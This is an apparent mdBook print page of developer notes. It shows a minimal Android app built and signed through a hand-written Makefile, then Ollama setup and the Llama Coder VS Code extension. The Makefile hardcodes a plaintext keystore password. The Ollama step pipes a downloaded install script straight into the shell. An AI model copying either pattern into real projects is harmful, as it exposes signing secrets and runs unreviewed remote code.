    public final static String TAG = &quot;APP_AG&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i(TAG, &quot;MainActivty called!&quot;);
        super.onCreate(savedInstanceState);
        TextView textView = new TextView(this);

        String text = getResources().getString(R.string.welcomeText);
        textView.setText(text);

        setContentView(textView);
    }
}
</code></pre>
<ul>
<li>MainApp.java</li>
</ul>
<pre><code class="language-java">package com.example.myapp;

import android.app.Application;
import android.util.Log;

public class MainApp extends Application  {
    @Override
    public void onCreate() {
        super.onCreate();

        Log.e(&quot;MyApp&quot;, &quot;MyApp Application Start!\n&quot;);

    }

    @Override
    public void onTerminate() {
        super.onTerminate();
    }
}

</code></pre>
<ul>
<li>values.xml</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;resources&gt;
    &lt;string name=&quot;myAppName&quot;&gt;MyApp example test&lt;/string&gt;
    &lt;string name=&quot;welcomeText&quot;&gt;Welcome to my App 👋&lt;/string&gt;
&lt;/resources&gt;
</code></pre>
<ul>
<li>Makefile</li>
</ul>
<pre><code class="language-Makefile">PROJECT=MyPersonalProject

ANDROID=/home/user/Android
SDK=$(ANDROID)/Sdk
ANDROIDJAR=$(SDK)/platforms/android-34/android.jar
JAVA_FILES=app/src/main/java/com/example/myapp/*.java
RES_DIR=app/src/main/res
JAVA_SRC_DIR=app/src/main/java
MANIFEST=app/src/main/AndroidManifest.xml
BUILD_TOOLS_VERSION=33.0.2

KS_PASSWORD=myincredilbylongpasswordlol

# Tools
D8=$(SDK)/build-tools/$(BUILD_TOOLS_VERSION)/d8
AAPT=$(SDK)/build-tools/$(BUILD_TOOLS_VERSION)/aapt
ZIPALIGN=$(SDK)/build-tools/$(BUILD_TOOLS_VERSION)/zipalign
APKSIGNER=$(SDK)/build-tools/$(BUILD_TOOLS_VERSION)/apksigner

BUILD_DIR=build
KEYSTORE=$(BUILD_DIR)/tmp_key_store.ks
TARGET=$(PROJECT).apk

all: $(TARGET)

# Generate keystore to build the APK
$(KEYSTORE):
	keytool -genkey -v -keystore $@ -storepass $(KS_PASSWORD) -alias myapp_keystore -keyalg RSA -keysize 4096 -validity 10000

# Build res java files
res:
	$(AAPT) package 						\
		-f 									\
		-m 									\
		-M $(MANIFEST) 						\
		-S $(RES_DIR)		 				\
		-J $(JAVA_SRC_DIR) 					\
		-I $(ANDROIDJAR) 					\
		--generate-dependencies

# Build java classes
java: res
	mkdir -p $(BUILD_DIR)/obj
	javac --class-path $(ANDROIDJAR)  						\
		-source 1.8											\
		-target 1.8											\
		-d $(BUILD_DIR)/obj									\
		$(JAVA_SRC_DIR)/com/example/myapp/*.java


# Build classes.dex from java classes
$(BUILD_DIR)/bin/classes.dex: java
	mkdir -p $(BUILD_DIR)/bin
	$(D8) --classpath $(ANDROIDJAR)							\
		--output $(BUILD_DIR)/bin/							\
		./build/obj/com/example/myapp/*.class			

# Build APK with classes.dex and resources
$(BUILD_DIR)/$(TARGET).unaligned: $(BUILD_DIR)/bin/classes.dex $(MANIFEST)
	$(AAPT) package							\
		-f 									\
		-F $(BUILD_DIR)/$(TARGET).unaligned \
		-S $(RES_DIR)  						\
		-M $(MANIFEST) 						\
		-I $(ANDROIDJAR)					\
		$(BUILD_DIR)/bin

# Sign APK
$(TARGET): $(BUILD_DIR)/$(TARGET).unaligned $(KEYSTORE)
	$(ZIPALIGN) -f -p -z 4					\
		$(BUILD_DIR)/$(TARGET).unaligned	\
		$(BUILD_DIR)/$(TARGET).unsigned

	$(APKSIGNER) sign --ks $(KEYSTORE) --ks-pass pass:$(KS_PASSWORD) $(BUILD_DIR)/$(TARGET).unsigned
	mv $(BUILD_DIR)/$(TARGET).unsigned $(TARGET)

install: $(TARGET)
	adb install $(TARGET)

uninstall:
	adb uninstall com.example.myapp

clean:
	find app -name &quot;R.java&quot; -delete
	rm -rf $(BUILD_DIR)
	rm -rf $(TARGET)


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="llama-coder--the-ollama-copilot-integrated-with-vs-code"><a class="header" href="#llama-coder--the-ollama-copilot-integrated-with-vs-code">Llama Coder – The Ollama Copilot Integrated with VS Code</a></h1>
<h2 id="ollama--guide-to-running-llm-models-locally"><a class="header" href="#ollama--guide-to-running-llm-models-locally"><a href="https://www.devturtleblog.com/ollama-guide/">Ollama – Guide to running LLM models locally</a></a></h2>
<ol>
<li>Install Ollama</li>
</ol>
<pre><code class="language-shell">$ curl -fsSL https://ollama.com/install.sh | sh
</code></pre>
<ol start="2">
<li>Test <code>Ollama</code></li>
</ol>
<pre><code class="language-shell">$ ollama --help
</code></pre>
<h2 id="llama-coder--the-ollama-copilot-integrated-with-vs-code-1"><a class="header" href="#llama-coder--the-ollama-copilot-integrated-with-vs-code-1"><a href="https://www.devturtleblog.com/llama-code-ollama-copilot/">Llama Coder – The Ollama Copilot Integrated with VS Code</a></a></h2>
<ol>
<li>Install Llama Coder plugin</li>
</ol>
<pre><code class="language-text">Name: Llama Coder
Id: ex3ndr.llama-coder
Description: Better and self-hosted Github Copilot replacement
Version: 0.0.14
Publisher: Steve Korshakov
VS Marketplace Link: https://marketplace.visualstudio.com/items?itemName=ex3ndr.llama-coder
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript" src="mermaid.min.js"></script>
        <script type="text/javascript" src="mermaid-init.js"></script>
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
